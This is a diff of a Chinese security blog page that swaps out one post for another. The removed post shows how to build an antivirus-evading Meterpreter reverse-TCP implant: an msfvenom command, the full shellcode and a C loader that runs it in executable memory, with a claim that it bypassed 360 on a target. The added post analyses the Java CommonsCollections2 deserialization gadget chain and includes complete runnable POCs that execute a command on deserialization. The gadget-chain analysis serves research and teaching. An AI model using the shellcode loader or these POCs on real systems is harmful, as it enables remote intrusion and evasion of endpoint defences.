@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>红蓝攻防-EXE免杀过360 | 六月的雨</title>
+  <title>Java反序列化-CommonsCollections2分析 | 六月的雨</title>
   <meta name="keywords" content=" Hexo , Markdown ">
-  <meta name="description" content="红蓝攻防-EXE免杀过360 | 六月的雨">
+  <meta name="description" content="Java反序列化-CommonsCollections2分析 | 六月的雨">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="CommonsCollections2版本要求：  DK版本：无要求 CommonsCollections 4.0(cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化)  具备知识：  反射 动态代理 javassist ClassLoader#defineClass TemplatesImpl  添加依赖： &lt;depend">
 <meta property="og:type" content="article">
@@ -656,9 +656,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-红蓝攻防-EXE免杀过360" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Java反序列化-CommonsCollections2分析" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">红蓝攻防-EXE免杀过360</h1>
+        <h1 class="article-title">Java反序列化-CommonsCollections2分析</h1>
     
     <div class="article-meta">
         
@@ -668,7 +668,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="红蓝攻防">红蓝攻防</a>
+            <a  data-rel="Java反序列化">Java反序列化</a>
             
         </span>
         
@@ -685,12 +685,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-10-28 23:09:35'>2021-07-07 20:16</time>
+            Created At : <time class="date" title='Updated At: 2021-12-08 11:17:47'>2021-12-06 22:00</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:448</span>
+        <span>Count:2.9k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -720,7 +720,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollections2"><span class="toc-text">CommonsCollections2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-javassist%E5%AD%A6%E4%B9%A0"><span class="toc-text">0x02 javassist学习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ClassLoader-defineClass"><span class="toc-text">0x04 ClassLoader#defineClass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">0x05 利用链分析（命令执行）：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9POC%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%A7%A3%E9%87%8A"><span class="toc-text">对POC的一些代码进行解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">0x06 利用链分析（代码执行）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%9A"><span class="toc-text">完整的利用链：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%EF%BC%9A"><span class="toc-text">完整的代码执行POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -736,13 +736,372 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>MSF生成编译混淆木马msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=9090 -ex64/shikata_ga_nai -i 8 -f c &gt; shell.c</p>
-<p><img src="http://tva1.sinaimg.cn/large/006yXVokgy1gvvbekzgezj30w60ewk0j.jpg" alt="Image.png"></p>
-<p>使用VCC+编译器#include &lt;stdio.h&gt;#include &lt;windows.h&gt;<br>unsigned char payload[] =”\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30””\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28””\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49””\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78””\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x8b\x48\x18\x01\xd3\x50””\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xc1””\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24””\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c””\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59””\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d””\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26””\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68””\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x01\x67\x68\x02””\x00\x23\x82\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea””\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61””\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00””\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83””\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a””\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57””\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00””\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68””\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff””\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb””\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5”;<br>size_t size = 577;<br>int main(int argc, char** argv) {char* code;printf(“Hello Hack saul!\n”);code = (char*)VirtualAlloc(NULL, size,MEM_COMMIT,PAGE_EXECUTE_READWRITE);memcpy(code, payload, size);((void(*)())code)();return(0);}</p>
-<p><img src="http://tva1.sinaimg.cn/large/006yXVokgy1gvvfdd1fbvj318g0qetis.jpg" alt="Image.png"></p>
-<p><img src="http://tva1.sinaimg.cn/large/006yXVokgy1gvvfdqsbdcj30rf0bfgpk.jpg" alt="Image.png"></p>
-<p>把免杀马上传到目标系统，绕过了360</p>
-<p><img src="http://tva1.sinaimg.cn/large/006yXVokgy1gvvfdzyubfj31au0io7iv.jpg" alt="Image.png"></p>
+        <h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><p>版本要求：</p>
+<ul>
+<li>DK版本：无要求</li>
+<li>CommonsCollections 4.0(cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化)</li>
+</ul>
+<p>具备知识：</p>
+<ul>
+<li>反射</li>
+<li>动态代理</li>
+<li>javassist</li>
+<li>ClassLoader#defineClass</li>
+<li>TemplatesImpl</li>
+</ul>
+<p>添加依赖：</p>
+<pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
+    &lt;version&gt;4.0&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.javassist&lt;/groupId&gt;
+    &lt;artifactId&gt;javassist&lt;/artifactId&gt;
+    &lt;version&gt;3.25.0-GA&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h2 id="0x01利用链"><a href="#0x01利用链" class="headerlink" title="0x01利用链"></a>0x01利用链</h2><p>PriorityQueue</p>
+<p>TransformingComparator.compare()</p>
+<p>InvokerTransformer</p>
+<pre><code>TemplatesImpl.getOutputProperties()
+ TemplatesImpl.newTransformer()
+TemplatesImpl.getTransletInstance()
+TemplatesImpl.defineTransletClasses()
+TransletClassLoader.defineClass()
+</code></pre>
+<p>ClassLoader#defineClass</p>
+<p>javassist</p>
+<h2 id="0x02-javassist学习"><a href="#0x02-javassist学习" class="headerlink" title="0x02 javassist学习"></a>0x02 javassist学习</h2><p>因为本次利用链需要用到，所以需要先了解一下javassist是干嘛的</p>
+<p>javassit是用于对生成的class文件进行修改，或以完全手动的方式，生成一个class文件。</p>
+<p>假设我们需要生成一个User类：</p>
+<pre><code class="java">public class User &#123;
+    private String name;
+
+    public User(String name) &#123;
+        this.name = name;
+    &#125;
+
+    public User() &#123;
+    &#125;
+
+    public String getName() &#123;
+        return name;
+    &#125;
+
+    public void setName(String name) &#123;
+        this.name = name;
+    &#125;
+
+    @Override
+    public String toString() &#123;
+        return &quot;name=&quot;+name;
+    &#125;
+&#125;
+</code></pre>
+<p>javassist创建代码如下：</p>
+<pre><code class="java">public class UserGenerator &#123;
+    public static void main(String[] args) throws Exception &#123;
+        ClassPool classPool = ClassPool.getDefault();
+        //定义User类
+        CtClass ctClassUser = classPool.makeClass(&quot;com.tianshouzhi.User&quot;);
+
+        //定义name字段
+        CtClass fieldType = classPool.get(&quot;java.lang.String&quot;);//字段类型
+        String name = &quot;name&quot;;//字段名称
+        CtField ctFieldName=new CtField(fieldType, name,ctClassUser);
+        ctFieldName.setModifiers(Modifier.PRIVATE);//设置访问修饰符
+        ctClassUser.addField(ctFieldName, CtField.Initializer.constant(&quot;javasssit&quot;));//添加name字段，赋值为javassist
+
+        //定义构造方法
+        CtClass[] parameters = new CtClass[]&#123;classPool.get(&quot;java.lang.String&quot;)&#125;;//构造方法参数
+        CtConstructor constructor=new CtConstructor(parameters,ctClassUser);
+        String body = &quot;&#123;this.name=$1;&#125;&quot;;//方法体 $1表示的第一个参数
+        constructor.setBody(body);
+        ctClassUser.addConstructor(constructor);
+
+        //setName getName方法
+        ctClassUser.addMethod(CtNewMethod.setter(&quot;setName&quot;,ctFieldName));
+        ctClassUser.addMethod(CtNewMethod.getter(&quot;getName&quot;,ctFieldName));
+
+        //toString方法
+        CtClass returnType = classPool.get(&quot;java.lang.String&quot;);
+        String methodName = &quot;toString&quot;;
+        CtMethod toStringMethod=new CtMethod(returnType, methodName, null,ctClassUser);
+        toStringMethod.setModifiers(Modifier.PUBLIC);
+        String methodBody = &quot;&#123;return \&quot;name=\&quot;+$0.name;&#125;&quot;;//$0表示的是this
+        toStringMethod.setBody(methodBody);
+        ctClassUser.addMethod(toStringMethod);
+
+        //代表class文件的CtClass创建完成，现在将其转换成class对象
+        Class clazz = ctClassUser.toClass();
+        Constructor cons = clazz.getConstructor(String.class);
+        Object user = cons.newInstance(&quot;wangxiaoxiao&quot;);
+        Method toString = clazz.getMethod(&quot;toString&quot;);
+        System.out.println(toString.invoke(user));
+
+        ctClassUser.writeFile(&quot;.&quot;);//在当前目录下，生成com/tianshouzhi/User.class文件
+    &#125;
+&#125;
+</code></pre>
+<p>运行程序后输出：</p>
+<p>name=wangxiaoxiao</p>
+<p>通过反编译工具(例如：JD-gui )打开User.class 可以看到类似以下代码：</p>
+<p><img src="http://static.tianshouzhi.com/ueditor/upload/image/20170429/1493459043588069152.png" alt="Image.png"></p>
+<h2 id="0x04-ClassLoader-defineClass"><a href="#0x04-ClassLoader-defineClass" class="headerlink" title="0x04 ClassLoader#defineClass"></a>0x04 ClassLoader#defineClass</h2><pre><code>public class JavasistTest &#123;
+
+   public static void main(String[] args) throws Exception&#123;
+       //使用Javasist生成一个.class文件
+       ClassPool pool = ClassPool.getDefault();
+       pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+       CtClass test = pool.makeClass(&quot;Evil&quot;);
+       String name = &quot;Evil&quot; + System.nanoTime();
+       test.setName(name);
+       String cmd = &quot;System.out.println(\&quot;Hello,Javasist\&quot;);&quot;;
+       test.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+       CtConstructor constructor = test.makeClassInitializer();
+       constructor.insertBefore(cmd);
+       test.writeFile(&quot;./&quot;);
+
+       byte[] bytes = test.toBytecode();//转换成字节码
+       Class clas = Class.forName(&quot;java.lang.ClassLoader&quot;);
+
+       Method defineclass = clas.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);
+       defineclass.setAccessible(true);
+       Class claz = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),&quot;Evil&quot;,bytes,0,bytes.length);
+       claz.newInstance();
+
+  &#125;
+&#125;
+</code></pre>
+<p>这里的ClassLoader#defineClass方法是protected所以我们无法直接从外部进行调用，所以我们这里需要借助反射来调用这个方法</p>
+<h2 id="0x05-利用链分析（命令执行）："><a href="#0x05-利用链分析（命令执行）：" class="headerlink" title="0x05 利用链分析（命令执行）："></a>0x05 利用链分析（命令执行）：</h2><p>第一步：TransformingComparator#compare方法</p>
+<p><code>TransformingComparator</code>是一个修饰器，和CC1中的<code>ChainedTransformer</code>类似。</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207095605754.png" alt="image-20211207095605754"></p>
+<p>可以看到obj1是形参，这个是可控的，然后我们要判断this.transformer是否也是可控的，可以全局搜一下</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207095753071.png" alt="image-20211207095753071"></p>
+<p>找到可以使用TransformingComparator的构造器对this.transformer进行赋值，所以this.transformer是可控的，那this.transformer.transform(obj)。我们可以想办法变成InvokerTransformer.transform()，这个应该看起来很熟悉，就是cc1中的后半条链，所以可以触发命令执行，弹计算器。</p>
+<p>第二步：我们需要找到可以调用TransformingComparator，并且重写了readObject作为入口的类，同时这个类也需要具备可序列化的要求。于是我们找到了PriorityQueue。</p>
+<p>PriorityQueue() 使用默认的初始容量（11）创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</p>
+<p>先查看PriorityQueue#readObject</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100209490.png" alt="image-20211207100209490"></p>
+<p>第一个方框，是对对象s进行序列化，然后存放到数组queue[i]中，这里的queue[i]是序列化得来的，所以是可控的。</p>
+<p>第二个方框，调用了heapify()，我们跟进去</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100452403.png" alt="image-20211207100452403"></p>
+<p>同上，queue[i]是可控的，跟进siftDown()</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100532469.png" alt="image-20211207100532469"></p>
+<p>这里的形参E x就是上面的queue[i]，所以可控。但comparator不为null时，跟进siftDownUsingComparator()</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100729212.png" alt="image-20211207100729212"></p>
+<p>发现在红框处调用了comparator的compare函数, 同上这里的 <code>x</code>是可控的，我们可以看一下comparator是否可控，搜一下，</p>
+<pre><code>private final Comparator&lt;? super E&gt; comparator;
+</code></pre>
+<p>找到comparator是一个参数，可以通过反射进行修改它的值，这里我们可以修改成TransformingComparator。</p>
+<p>到这里我们就可以构造POC了，这里的POC还是比较简单的</p>
+<pre><code>import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+public class cc2Test &#123;
+    public static void main(String[] args) throws Exception&#123;
+        //cc1中的后半段链
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;
+                        String.class, Class[].class &#125;, new Object[] &#123;
+                        &quot;getRuntime&quot;, new Class[0] &#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;
+                        Object.class, Object[].class &#125;, new Object[] &#123;
+                        null, new Object[0] &#125;),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;);
+        TransformingComparator transformingComparator = new TransformingComparator(chain);
+
+
+        //也可通过构造函数直接进行传入
+        //PriorityQueue queue = new PriorityQueue(1,transformingComparator);
+        PriorityQueue queue = new PriorityQueue(1);
+        queue.add(1);
+        queue.add(2);
+
+        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        field.setAccessible(true);
+        field.set(queue,transformingComparator);
+
+        try&#123;
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;/Users/20174/Desktop/evil.bin&quot;));
+            outputStream.writeObject(queue);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;/Users/20174/Desktop/evil.bin&quot;));
+            inputStream.readObject();
+        &#125;catch(Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207101514337.png" alt="image-20211207101514337"></p>
+<h3 id="对POC的一些代码进行解释"><a href="#对POC的一些代码进行解释" class="headerlink" title="对POC的一些代码进行解释"></a>对POC的一些代码进行解释</h3><p>第一个方框是CC1中后半条链，用于触发pyload</p>
+<p>第二个方框是TransformingComparator.</p>
+<p>第三个方框：</p>
+<p>queue.add两次，如果我们只添加一个的话，最终结果会为-1从而无法进入siftDown函数</p>
+<pre><code>private void heapify() &#123;
+    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)
+        siftDown(i, (E) queue[i]);
+&#125;
+</code></pre>
+<p>到这里其实我们发现cc2中使用的是javasist 和 TemplatesImpl，利用字节码来进行执行代码的，因为我们上的POC只能执行命令，无法造成代码执行，所以下面我们分析下第二种利用方式</p>
+<h2 id="0x06-利用链分析（代码执行）："><a href="#0x06-利用链分析（代码执行）：" class="headerlink" title="0x06 利用链分析（代码执行）："></a>0x06 利用链分析（代码执行）：</h2><p>这里才是真正的CC2，能够进行RCE。</p>
+<p>我们先分析后半条链，也就是如何触发RCE的。然后在拼接前半条链，我个人喜欢逆向先知道如何触发RCE，再找入口去触发后半条链。</p>
+<p>第一步：首先我们使用javassist，生成静态代码块，注意：静态代码块会在创建类实例的时候执行。</p>
+<pre><code>import javassist.*;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
+public class javassit_test &#123;
+    public static void createPseson() throws Exception &#123;
+
+        ClassPool pool = ClassPool.getDefault();
+        CtClass cc = pool.makeClass(&quot;Cat&quot;);
+        String cmd = &quot;System.out.println(\&quot;evil code\&quot;);&quot;;
+        // 创建 static 代码块，并插入代码
+        cc.makeClassInitializer().insertBefore(cmd);
+        String randomClassName = &quot;EvilCat&quot; + System.nanoTime();
+        cc.setName(randomClassName);
+        // 写入.class 文件
+        cc.writeFile();
+    &#125;
+
+    public static void main(String[] args) &#123;
+        try &#123;
+            createPseson();
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>使用jadx-gui查看生成的class文件</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207164530520.png" alt="image-20211207164530520"></p>
+<p>第二步：我们看回TemplatesImpl，主要是利用TemplatesImpl触发上面的静态代码块，形成后半条链，这个思路不能乱。</p>
+<p>TemplatesImpl#newTransformer()调用了getTransletInstance()：</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207155253060.png" alt="image-20211207155253060"></p>
+<p>跟进getTransletInstance(),先看一个方框，调用了defineTransletClasses(),这里第二个方框后续会执行，后面进行解释：</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207155417381.png" alt="image-20211207155417381"></p>
+<p>跟进defineTransletClasse()，这里通过loader.defineClass的方式将bytecodes还原为Class：</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207155753453.png" alt="image-20211207155753453"></p>
+<p>然后返回来看刚说到的第二个方框，调用了_class[_transletIndex].newInstance方法实例化还原的Class。此时static语句块成功执行。</p>
+<p>到这里我们的后半条利用链是：</p>
+<pre><code>TemplatesImpl.newTransformer()
+            TemplatesImpl.getTransletInstance()
+            TemplatesImpl.defineTransletClasses
+                  newInstance()
+                  静态代码块Runtime.exec()
+</code></pre>
+<p>我们需要想办法找到入口调用TemplatesImpl.newTransformer()，来拼接后半条链。</p>
+<p>这里使用了InvokerTransformer#transform的反射来调用TemplatesImpl#newtransformer，我们可以使用前面说到的第一二步，简单化的链我理解长下面这样：</p>
+<p>入口PriorityQueue.readObject()-&gt;&gt;TransformingComparator.compare()–&gt;&gt;InvokerTransformer#transform–&gt;&gt;InvokerTransformer#transform</p>
+<h2 id="完整的利用链："><a href="#完整的利用链：" class="headerlink" title="完整的利用链："></a>完整的利用链：</h2><pre><code>ObjectInputStream.readObject()
+    PriorityQueue.readObject()
+        PriorityQueue.heapify()
+            PriorityQueue.siftDown()
+                PriorityQueue.siftDownUsingComparator()
+                    TransformingComparator.compare()
+                        InvokerTransformer.transform()
+                                Method.invoke()
+                                    TemplatesImpl.newTransformer()
+                                         TemplatesImpl.getTransletInstance()
+                                         TemplatesImpl.defineTransletClasses
+                                         newInstance()
+                                            Runtime.exec()
+</code></pre>
+<h2 id="完整的代码执行POC："><a href="#完整的代码执行POC：" class="headerlink" title="完整的代码执行POC："></a>完整的代码执行POC：</h2><pre><code>import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+public class cc2 &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
+        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+
+        //创建动态一个类，设置父类添加命令执行内容
+        ClassPool classPool=ClassPool.getDefault();//返回默认的类池
+        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
+        CtClass payload=classPool.makeClass(&quot;CommonsCollections22222222222&quot;);//创建一个新的public类
+        payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
+        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); //创建一个空的类初始化，设置构造函数主体为runtime
+
+        byte[] bytes=payload.toBytecode();//转换为byte数组
+
+        //反射获取_bytecodes的值，设置为转换后的payload的字节码。_name也是一样的方式设置为test
+        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();//反射创建TemplatesImpl
+        Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);//反射获取templatesImpl的_bytecodes字段
+        field.setAccessible(true);//暴力反射
+        field.set(templatesImpl,new byte[][]&#123;bytes&#125;);//将templatesImpl上的_bytecodes字段设置为runtime的byte数组
+        Field field1=templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);//反射获取templatesImpl的_name字段
+        field1.setAccessible(true);//暴力反射
+        field1.set(templatesImpl,&quot;test&quot;);//将templatesImpl上的_name字段设置为test
+
+        
+        InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);
+        TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象
+        PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
+        queue.add(1);//添加数字1插入此优先级队列
+        queue.add(1);//添加数字1插入此优先级队列
+
+        Field field2=queue.getClass().getDeclaredField(&quot;comparator&quot;);//获取PriorityQueue的comparator字段
+        field2.setAccessible(true);//暴力反射
+        field2.set(queue,comparator);//设置queue的comparator字段值为comparator
+
+        Field field3=queue.getClass().getDeclaredField(&quot;queue&quot;);//获取queue的queue字段
+        field3.setAccessible(true);//暴力反射
+        field3.set(queue,new Object[]&#123;templatesImpl,templatesImpl&#125;);//设置queue的queue字段内容Object数组，内容为templatesImpl
+
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;test.out&quot;));
+        outputStream.writeObject(queue);
+        outputStream.close();
+
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;test.out&quot;));
+        inputStream.readObject();
+
+    &#125;
+&#125;
+</code></pre>
+<p>0x07 POC调试</p>
+<p>从入口进行调试，使用readObject进行反序列化，这里调用的是PriorityQueue重写的的readobject</p>
+<pre><code>inputStream.readObject()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171552395.png" alt="image-20211207171552395"></p>
+<p>PriorityQueue重写的的readobject会将序列化的字节码进行反序列化，然后赋给queue[i]，跟进heapify()：</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171832993.png" alt="image-20211207171832993"></p>
+<p>调用了siftDown()，跟进siftDown()</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171730170.png" alt="image-20211207171730170"></p>
+<p>调用了siftDownUsingComparator(k,x)，这里的x就是siftDown()中的queue[i]，所以是可控的</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207172625630.png" alt="image-20211207172625630"></p>
+<p>跟进到<code>siftDownUsingComparator</code>方法里面，发现会方法会去调用<code>comparator</code>的<code>compare</code>,因为我们这里的<code>compare</code>是被<code>TransformingComparator</code>修饰过的<code>InvokerTransformer</code>实例化对象。所以这里调用的就是<code>TransformingComparator</code>的<code>compare</code>。</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207172842788.png" alt="image-20211207172842788"></p>
+<p>跟进到方法里面，<code>this.iMethodName</code>内容为<code>newTransformer</code>反射调用了<code>newTransformer</code>方法。再跟进一下。</p>
+<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20211207173108483.png" alt="image-20211207173108483"></p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207173359890.png" alt="image-20211207173359890"></p>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1242/#_8">https://paper.seebug.org/1242/#_8</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&amp;mid=2247483897&amp;idx=1&amp;sn=b8d6b00abc2c8be1abafd30814f9f9d6&amp;chksm=cf0321b4f874a8a2a6e1983a4f8023f25e41ba9779d10188581cd9218f7a18ec74b298f7cc94&amp;token=1815809254&amp;lang=zh_CN#rd">https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&amp;mid=2247483897&amp;idx=1&amp;sn=b8d6b00abc2c8be1abafd30814f9f9d6&amp;chksm=cf0321b4f874a8a2a6e1983a4f8023f25e41ba9779d10188581cd9218f7a18ec74b298f7cc94&amp;token=1815809254&amp;lang=zh_CN#rd</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/219840#h2-0">https://www.anquanke.com/post/id/219840#h2-0</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2017441810@qq.com </span>
@@ -756,12 +1115,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">Title:</span>红蓝攻防-EXE免杀过360</p>
-    <p><span class="copy-title">Count:</span><span class="post-count">448</span></p>
+    <p><span class="copy-title">Title:</span>Java反序列化-CommonsCollections2分析</p>
+    <p><span class="copy-title">Count:</span><span class="post-count">2.9k</span></p>
     <p><span class="copy-title">Author:</span><a  title="juneRain">juneRain</a></p>
-    <p><span class="copy-title">Created At:</span>2021-07-07, 20:16:12</p>
-    <p><span class="copy-title">Updated At:</span>2021-10-28, 23:09:35</p>
